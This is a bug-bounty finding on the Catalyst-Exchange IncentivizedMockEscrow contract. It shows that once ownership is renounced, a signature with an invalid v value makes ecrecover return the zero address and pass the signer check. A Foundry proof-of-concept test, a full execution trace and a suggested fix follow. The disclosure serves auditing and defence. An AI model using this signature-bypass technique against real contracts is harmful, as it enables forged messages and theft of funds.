# [M] Signature Bypass when renounceOwnership() happens in IncentivizedMockEscrow.sol.

## Summary
Severity: Medium
Chain: Smart contract
Component: Catalyst-Exchange
Published: 2024-01-29
Source: https://github.com/hats-finance/Catalyst-Exchange-0x3026c1ea29bf1280f99b41934b2cb65d053c9db4/issues/60
Type: hats-finding

## Details
**Github username:** @erictee2802
**Twitter username:** 0xEricTee
**Submission hash (on-chain):** 0x9a7fc1c76d4ef9f3e4798e9fb4975f13b683a020457a9f74c185117188d1b386
**Severity:** medium

**Description:**
**Description**\
From `IncentivizedMockEscrow.sol`:
```javascript
contract IncentivizedMockEscrow is IncentivizedMessageEscrow, Ownable2Step {
```
The contract inherits `Ownable2Step` contract, meaning that `renounceOwnership()` function can be used to set owner to address(0).

In `IncentivizedMockEscrow::_verifyPacket()`:

```javascript
 function _verifyPacket(bytes calldata _metadata, bytes calldata _message) internal view override returns(bytes32 sourceIdentifier, bytes memory implementationIdentifier, bytes calldata message_) {

        // Get signature from message payload
        (uint8 v, bytes32 r, bytes32 s) = abi.decode(_metadata, (uint8, bytes32, bytes32));

        // Get signer of message
        address messageSigner = ecrecover(keccak256(_message), v, r, s); 

        // Check signer is the same as the stored signer.
        require(messageSigner == owner(), "!signer");

        // Load the identifier for the calling contract.
        implementationIdentifier = _message[0:32];

        // Local "supposedly" this chain identifier.
        bytes32 thisChainIdentifier = bytes32(_message[64:96]);

        // Check that the message is intended for this chain.
        require(thisChainIdentifier == UNIQUE_SOURCE_IDENTIFIER, "!Identifier");

        // Local the identifier for the source chain.
        sourceIdentifier = bytes32(_message[32:64]);

        // Get the application message.
        message_ = _message[96:];
    }
```
The line `require(messageSigner == owner(), "!signer");` checks that the message is indeed signed by legit signer. However, when `renounceOwnership()` function is called, attacker can specify an invalid `v` value to return address(0) during `ecrecover`.


**Attack Scenario**\
Signature Bypass when `renounceOwnership()` function is called.


**Attachments**

NA


1. **Proof of Concept (PoC) File**
<!-- You must provide a file containing a proof of concept (PoC) that demonstrates the vulnerability you have discovered. -->

Add the following test to `SendMessagePayment.t.sol`:

```javascript
 function test_signature_bypass_if_ownership_renounced_happened(bytes calldata message) external {
        vm.prank(address(SIGNER));
        (bool success, ) = address(escrow).call(abi.encodeWithSignature("renounceOwnership()"));
        require(success);
        (bool success2, bytes memory result) = address(escrow).call(abi.encodeWithSignature("owner()"));
        require(success2);
        address owner = abi.decode(result,(address));
        assertEq(owner, address(0));
   
        address RANDOM_USER;
        uint RANDOMKEY;
        (RANDOM_USER, RANDOMKEY) = makeAddrAndKey("random_user");
        (, bytes memory messageWithContext) = setupsubmitMessage(address(application), message);
        bytes32 feeRecipient = bytes32(uint256(uint160(address(this))));

        (, bytes32 r, bytes32 s) = vm.sign(RANDOMKEY, keccak256(messageWithContext));
        uint8 v2 = 29; //Invalid v value to return address(0) during ecrecover.
        bytes memory mockContext2 = abi.encode(v2, r, s);

         escrow.processPacket{value: SEND_MESSAGE_PAYMENT_COST}(
            mockContext2,
            messageWithContext,
            feeRecipient
        );

    }
```
Run the test with `forge test --match-test test_signature_bypass_if_ownership_renounced_happened  -vvvv`.

Foundry Result:

```javascript
Running 1 test for test/IncentivizedMessageEscrow/feature/SendMessagePayment.t.sol:sendPacketPaymentTest
[PASS] test_signature_bypass_if_ownership_renounced_happened(bytes) (runs: 256, μ: 180792, ~: 180592)
Traces:
  [180592] sendPacketPaymentTest::test_signature_bypass_if_ownership_renounced_happened(0x0000000000000000000000000000000000000000000000000000000000000bcd)
    ├─ [0] VM::prank(signer: [0x6E12D8C87503D4287c294f2Fdef96ACd9DFf6bd2])
    │   └─ ← ()
    ├─ [7368] IncentivizedMockEscrow::renounceOwnership()
    │   ├─ emit OwnershipTransferred(previousOwner: signer: [0x6E12D8C87503D4287c294f2Fdef96ACd9DFf6bd2], newOwner: 0x0000000000000000000000000000000000000000)
    │   └─ ← ()
    ├─ [506] IncentivizedMockEscrow::owner()
    │   └─ ← 0x0000000000000000000000000000000000000000
    ├─ [0] VM::addr(43288845076666505671404451326770497101262437983615640076328173148592930870531 [4.328e76]) [staticcall]
    │   └─ ← 0xE2F70c5cbD298Fb122db24264d8923E348CeDaE3
    ├─ [0] VM::label(0xE2F70c5cbD298Fb122db24264d8923E348CeDaE3, "random_user")
    │   └─ ← ()
    ├─ [0] VM::recordLogs()
    │   └─ ← ()
    ├─ [2572] IncentivizedMockEscrow::estimateAdditionalCost() [staticcall]
    │   └─ ← 0x0000000000000000000000000000000000000000, 10000 [1e4]
    ├─ [75161] MockApplication::submitMessage{value: 529440925003}(0x8000000000000000000000000000000000000000000000000000000000123123, 0x1400000000000000000000000000000000000000000000000000000000000000000000000000000000000000002e234dae75c793f67a35089c9d99245e1c58470b, 0x0000000000000000000000000000000000000000000000000000000000000bcd, IncentiveDescription({ maxGasDelivery: 1199199 [1.199e6], maxGasAck: 1188188 [1.188e6], refundGasTo: 0xBf0b5A4099F0bf6c8bC4252eBeC548Bae95602Ea, priceOfDeliveryGas: 123321 [1.233e5], priceOfAckGas: 321123 [3.211e5], targetDelta: 1800 }))
    │   ├─ [66811] IncentivizedMockEscrow::submitMessage{value: 529440925003}(0x8000000000000000000000000000000000000000000000000000000000123123, 0x1400000000000000000000000000000000000000000000000000000000000000000000000000000000000000002e234dae75c793f67a35089c9d99245e1c58470b, 0x0000000000000000000000000000000000000000000000000000000000000bcd, IncentiveDescription({ maxGasDelivery: 1199199 [1.199e6], maxGasAck: 1188188 [1.188e6], refundGasTo: 0xBf0b5A4099F0bf6c8bC4252eBeC548Bae95602Ea, priceOfDeliveryGas: 123321 [1.233e5], priceOfAckGas: 321123 [3.211e5], targetDelta: 1800 }))
    │   │   ├─ emit BountyPlaced(messageIdentifier: 0x5c775e9950601f1852b00e7761a7da00074f7b426164cd658a593a957a8eef66, incentive: IncentiveDescription({ maxGasDelivery: 1199199 [1.199e6], maxGasAck: 1188188 [1.188e6], refundGasTo: 0xBf0b5A4099F0bf6c8bC4252eBeC548Bae95602Ea, priceOfDeliveryGas: 123321 [1.233e5], priceOfAckGas: 321123 [3.211e5], targetDelta: 1800 }))
    │   │   ├─ emit Message(destinationIdentifier: 0x8000000000000000000000000000000000000000000000000000000000123123, recipient: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f, message: 0x80000000000000000000000000000000000000000000000000000000001231238000000000000000000000000000000000000000000000000000000000123123005c775e9950601f1852b00e7761a7da00074f7b426164cd658a593a957a8eef661400000000000000000000000000000000000000000000000000000000000000000000000000000000000000002e234dae75c793f67a35089c9d99245e1c58470b1400000000000000000000000000000000000000000000000000000000000000000000000000000000000000002e234dae75c793f67a35089c9d99245e1c58470b000000124c5f0000000000000000000000000000000000000000000000000000000000000bcd)
    │   │   └─ ← 0, 0x5c775e9950601f1852b00e7761a7da00074f7b426164cd658a593a957a8eef66
    │   └─ ← 0, 0x5c775e9950601f1852b00e7761a7da00074f7b426164cd658a593a957a8eef66
    ├─ [0] VM::getRecordedLogs()
    │   └─ ← [([0x3156fe274a54f863eef7980d94abe2e7a9f1b61b73455777a26dd69a8cda0ff9, 0x5c775e9950601f1852b00e7761a7da00074f7b426164cd658a593a957a8eef66], 0x0000000000000000000000000000000000000000000000000000000000124c5f000000000000000000000000000000000000000000000000000000000012215c000000000000000000000000bf0b5a4099f0bf6c8bc4252ebec548bae95602ea000000000000000000000000000000000000000000000000000000000001e1b9000000000000000000000000000000000000000000000000000000000004e6630000000000000000000000000000000000000000000000000000000000000708, 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f), ([0x55d98696b252b788d21d4bb968cd6e13002c2a1fdda6f421bf95f58fea7dbdd1], 0x8000000000000000000000000000000000000000000000000000000000123123000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000200000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f000000000000000000000000000000000000000000000000000000000000010980000000000000000000000000000000000000000000000000000000001231238000000000000000000000000000000000000000000000000000000000123123005c775e9950601f1852b00e7761a7da00074f7b426164cd658a593a957a8eef661400000000000000000000000000000000000000000000000000000000000000000000000000000000000000002e234dae75c793f67a35089c9d99245e1c58470b1400000000000000000000000000000000000000000000000000000000000000000000000000000000000000002e234dae75c793f67a35089c9d99245e1c58470b000000124c5f0000000000000000000000000000000000000000000000000000000000000bcd0000000000000000000000000000000000000000000000, 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f)]
    ├─ [0] VM::sign(43288845076666505671404451326770497101262437983615640076328173148592930870531 [4.328e76], 0xd0cb78701bc65bdb2ec065b58fd056a18893bc69dfcd9d0f870972c8ed58a04e) [staticcall]
    │   └─ ← 28, 0x76741a3d819343d0f836aed67c61ac715c746f479ec91c1485db7487034961d0, 0x5d4e83c3bb4bb4798ace480a95c9c609629f363f70c66213da8b13e4287fa1a6
    ├─ [40190] IncentivizedMockEscrow::processPacket{value: 10000}(0x000000000000000000000000000000000000000000000000000000000000001d76741a3d819343d0f836aed67c61ac715c746f479ec91c1485db7487034961d05d4e83c3bb4bb4798ace480a95c9c609629f363f70c66213da8b13e4287fa1a6, 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f80000000000000000000000000000000000000000000000000000000001231238000000000000000000000000000000000000000000000000000000000123123005c775e9950601f1852b00e7761a7da00074f7b426164cd658a593a957a8eef661400000000000000000000000000000000000000000000000000000000000000000000000000000000000000002e234dae75c793f67a35089c9d99245e1c58470b1400000000000000000000000000000000000000000000000000000000000000000000000000000000000000002e234dae75c793f67a35089c9d99245e1c58470b000000124c5f0000000000000000000000000000000000000000000000000000000000000bcd, 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
    │   ├─ [3000] PRECOMPILES::ecrecover(0xd0cb78701bc65bdb2ec065b58fd056a18893bc69dfcd9d0f870972c8ed58a04e, 29, 53578051495947356555429151802933927533938800015662441725815634432784597606864, 42203818394982059518908309129859164655426110618808871594074930180453423882662) [staticcall]
    │   │   └─ ← ()
    │   ├─ [1127] MockApplication::receiveMessage(0x8000000000000000000000000000000000000000000000000000000000123123, 0x5c775e9950601f1852b00e7761a7da00074f7b426164cd658a593a957a8eef66, 0x1400000000000000000000000000000000000000000000000000000000000000000000000000000000000000002e234dae75c793f67a35089c9d99245e1c58470b, 0x0000000000000000000000000000000000000000000000000000000000000bcd)
    │   │   └─ ← 0xdcccfa35687233d0fa69459faadf9b6d27f58a1a0150ed273ef1baab7db38c18
    │   ├─ emit MessageDelivered(messageIdentifier: 0x5c775e9950601f1852b00e7761a7da00074f7b426164cd658a593a957a8eef66)
    │   ├─ emit Message(destinationIdentifier: 0x8000000000000000000000000000000000000000000000000000000000123123, recipient: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f, message: 0x80000000000000000000000000000000000000000000000000000000001231238000000000000000000000000000000000000000000000000000000000123123015c775e9950601f1852b00e7761a7da00074f7b426164cd658a593a957a8eef661400000000000000000000000000000000000000000000000000000000000000000000000000000000000000002e234dae75c793f67a35089c9d99245e1c58470b0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000007acf0000000000000001dcccfa35687233d0fa69459faadf9b6d27f58a1a0150ed273ef1baab7db38c18)
    │   └─ ← ()
    └─ ← ()

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 302.04ms
 
Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

2. **Revised Code File (Optional)**
<!-- If possible, please provide a second file containing the revised code that offers a potential fix for the vulnerability. This file should include the following information:
- Comment with a clear explanation of the proposed fix.
- The revised code with your suggested changes.
- Any additional comments or explanations that clarify how the fix addresses the vulnerability. -->

Either disable the use of `renounceOwnership()` function or use OpenZeppelin’s ECDSA library instead of the built-in function: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/cryptography/ECDSA.sol
